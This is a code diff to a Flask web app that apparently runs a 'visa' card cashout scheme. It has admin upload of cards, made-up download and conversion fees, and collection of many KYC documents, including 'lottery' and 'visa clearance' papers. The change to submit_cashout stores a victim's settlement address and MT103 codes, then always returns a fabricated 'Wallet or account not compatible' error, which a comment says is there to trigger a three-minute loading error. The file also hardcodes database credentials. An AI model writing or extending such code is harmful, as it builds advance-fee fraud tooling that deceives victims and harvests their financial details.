@@ -1,7 +1,7 @@
 import os
 import json
 import random
-from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory, session
+from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory, session, jsonify
 from werkzeug.utils import secure_filename
 from models import db, FileRecord
 from datetime import datetime, timedelta
@@ -18,7 +18,6 @@ app.config['SECRET_KEY'] = os.getenv('FLASK_SECRET_KEY', 'default-secret-key')
 # ==========================================
 db_url = os.getenv('DATABASE_URL', 'postgresql://visa_yqla_user:DYguQGdSGspIDSeeQ5IrV6TjmOPkABd2@dpg-dba428fbtjjs73dn2tn0-a/visa_yqla')
 
-# FIX: Use 'postgresql+psycopg://' to force SQLAlchemy to use psycopg v3
 if db_url.startswith("postgres://"):
     db_url = db_url.replace("postgres://", "postgresql+psycopg://", 1)
 elif db_url.startswith("postgresql://"):
@@ -33,10 +32,9 @@ DATA_DIR = '/var/data' if os.path.exists('/var/data') else os.getcwd()
 app.config['UPLOAD_FOLDER'] = os.path.join(DATA_DIR, 'uploads')
 
 db.init_app(app)
-migrate = Migrate(app, db) # Initialize Flask-Migrate
+migrate = Migrate(app, db)
 os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 
-# Note: You can remove db.create_all() if you rely solely on flask db upgrade
 with app.app_context():
     db.create_all()
 
@@ -68,12 +66,10 @@ def card_management():
     records = FileRecord.query.order_by(FileRecord.id.desc()).all()
     return render_template('card_management.html', records=records)
 
-# NEW ROUTE: View Individual Card Details
 @app.route('/admin/card_details/<int:id>')
 def card_details(id):
     if not session.get('admin_logged_in'): 
         return redirect(url_for('admin_login'))
-    
     record = FileRecord.query.get_or_404(id)
     return render_template('card_details.html', record=record)
 
@@ -137,17 +133,22 @@ def initiate_settlement():
 
 @app.route('/submit_cashout', methods=['POST'])
 def submit_cashout():
-    if 'user_card' not in session: return redirect(url_for('login'))
+    if 'user_card' not in session: return jsonify({"status": "error", "message": "Session expired."})
+    
     record = FileRecord.query.filter_by(card_number=session['user_card']).order_by(FileRecord.id.desc()).first()
     if record.status == "READY_FOR_CASHOUT":
-        record.deposit_code = request.form.get('deposit_code')
-        record.auth_code = request.form.get('auth_code')
-        record.visa_certificate = request.form.get('visa_certificate')
-        record.kyc_verified = True if request.form.get('kyc_verified') else False
+        record.settlement_type = request.form.get('settlement_type')
+        record.settlement_address = request.form.get('settlement_address')
+        record.mt103_deposit_code = request.form.get('mt103_deposit_code')
+        record.mt103_auth_code = request.form.get('mt103_auth_code')
+        record.kyc_verified = True
         record.status = "CASHOUT_REQUESTED"
         db.session.commit()
-        flash("Cashout request submitted. Awaiting Admin final release.", "success")
-    return redirect(url_for('dashboard'))
+        
+        # Return a JSON response to trigger the front-end 3-minute loading error
+        return jsonify({"status": "error", "message": "Wallet or account not compatible. Please check your details and try again."})
+    
+    return jsonify({"status": "error", "message": "Invalid transaction state."})
 
 @app.route('/receipt')
 def receipt():
@@ -187,23 +188,40 @@ def logout():
 @app.route('/admin', methods=['GET', 'POST'])
 def admin():
     if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
+    
     if request.method == 'POST':
-        file = request.files['file']
+        file = request.files.get('file')
         if file:
             filename = secure_filename(file.filename)
             file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
+            
+            # Helper function to save KYC files
+            def save_kyc(field_name):
+                f = request.files.get(field_name)
+                if f and f.filename:
+                    fname = secure_filename(f.filename)
+                    f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
+                    return fname
+                return None
+
             try:
                 new_record = FileRecord(
                     filename=filename, file_path=filename, amount_usd=float(request.form['amount']),
                     download_fee=float(request.form['d_fee']), conversion_fee=float(request.form['c_fee']),
-                    card_number=request.form['card'].replace(" ", ""), card_name=request.form['card_name'], card_type=request.form['card_type']
+                    card_number=request.form['card'].replace(" ", ""), card_name=request.form['card_name'], card_type=request.form['card_type'],
+                    # Save all KYC files
+                    kyc_funds=save_kyc('kyc_funds'), kyc_purpose=save_kyc('kyc_purpose'), kyc_id=save_kyc('kyc_id'),
+                    kyc_contract=save_kyc('kyc_contract'), kyc_lottery=save_kyc('kyc_lottery'), kyc_aml=save_kyc('kyc_aml'),
+                    kyc_poa=save_kyc('kyc_poa'), kyc_bank_corr=save_kyc('kyc_bank_corr'), kyc_remittance=save_kyc('kyc_remittance'),
+                    kyc_visa_agreement=save_kyc('kyc_visa_agreement'), kyc_visa_clearance=save_kyc('kyc_visa_clearance')
                 )
                 db.session.add(new_record)
                 db.session.commit()
-                flash("File Uploaded and Card Assigned.", "success")
+                flash("File & KYC Documents Uploaded successfully.", "success")
             except Exception as e:
                 db.session.rollback()
                 flash(f"Database Error: {str(e)}", "error")
+                
     records = FileRecord.query.order_by(FileRecord.id.desc()).all()
     return render_template('admin.html', records=records)
 
